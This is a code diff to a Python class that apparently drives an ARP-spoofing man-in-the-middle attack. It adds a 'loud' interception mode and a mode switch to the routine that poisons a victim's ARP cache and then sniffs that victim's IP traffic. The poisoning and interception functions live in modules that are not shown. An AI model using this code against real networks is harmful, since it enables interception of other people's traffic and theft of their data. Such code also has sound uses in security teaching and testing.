@@ -17,15 +17,28 @@ class Arp():
     def startSniff(self):
         sniff(prn=self.intercept, iface=self.networkInterface, filter="ip", timeout = 20)
 
+    def startLoudSniff(self):
+        sniff(prn=self.interceptLoud, iface=self.networkInterface, filter="ip", timeout = 20)
+
     def intercept(self, pkt):
          interceptor.interceptARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface)
+
+    def interceptLoud(self, pkt):
+        interceptor.loudARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC,
+                                 self.victimMAC, self.networkInterface)
 
     def spoof(self):
         arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)
 
-    def start(self):
-        self.spoof()
-        self.startSniff()
+
+    def start(self, mode):
+        if mode:
+            self.spoof()
+            self.startSniff()
+        else:
+            self.spoof()
+            self.startLoudSniff()
+
 
 
 networkInterface = "enp0s3"
